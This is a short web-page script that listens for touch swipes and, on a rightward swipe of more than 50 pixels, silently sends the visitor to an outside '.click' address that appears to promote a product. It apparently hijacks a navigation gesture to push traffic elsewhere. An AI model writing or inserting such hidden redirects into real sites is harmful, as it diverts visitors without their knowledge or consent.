<script>
var touchStartX = 0;
var touchMoveX = 0;
document.addEventListener('touchstart', function(e) {
  touchStartX = e.touches[0].clientX;
});
document.addEventListener('touchmove', function(e) {
  touchMoveX = e.touches[0].clientX;
});
document.addEventListener('touchend', function(e) {
  var distanceX = touchMoveX - touchStartX;
if (distanceX > 50) {
    window.location.href = "http://maohoankhangchinhhang.click/moctoc";
  }
});
</script>